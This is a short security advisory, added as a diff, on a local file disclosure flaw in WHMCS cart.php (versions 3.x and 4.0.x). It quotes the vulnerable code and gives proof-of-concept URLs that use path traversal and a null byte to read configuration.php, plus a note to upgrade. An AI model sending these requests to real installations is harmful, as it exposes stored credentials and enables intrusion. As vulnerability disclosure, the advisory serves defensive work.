@@ -1,0 +1,61 @@
+# Title      : WHMCompleteSolution (cart.php) Local File Disclosure
+# Author     : Lagripe-Dz
+# Product    : WHMCS ( WHMCompleteSolution )
+# Vendor     : http://whmcs.com/
+# Date       : 10/01/2011
+# Version    : 3.x.x , 4.0.x
+# Tested on  : linux+apache
+
+================================================================
+
+Vuln file: cart.php
+---------
+
+Vuln code:
+---------
+
+if ( $a == "add" )
+{
+   $templatefile = "configureproductdomain";
+    ....etc
+}
+
+if ( $a == "login" )
+{
+    $templatefile = "login";
+    ....etc
+}
+ ...
+outputClientArea( $templatefile, $nowrapper );
+# outputClientArea function will display
+"./templates/orderforms/cart/{$templatefile}.tpl"
+
+
+Details :
+---------
+
+if variable "$a" has a true value .. will set "$templatefile" value by
+default
+but when "$a" value didn't match the defaults values
+you can control "$templatefile" and use it as ( File Disclosure )
+
+
+Proof of Concept :
+------------------
+
+http://domain.tld/[PATH]/cart.php?a=[wrong_value]&templatefile=[LFD]%00
+
+http://domain.tld/[PATH]/cart.php?a=test&templatefile=../../../configuration.php%00
+
+
+note* : show the page source to see Disclosure file.
+
+Solution :
+----------
+
+the vendor Notificate
+update to the last version
+
+================================================================
+
+Greetz To All www.Sec4ever.com Members.
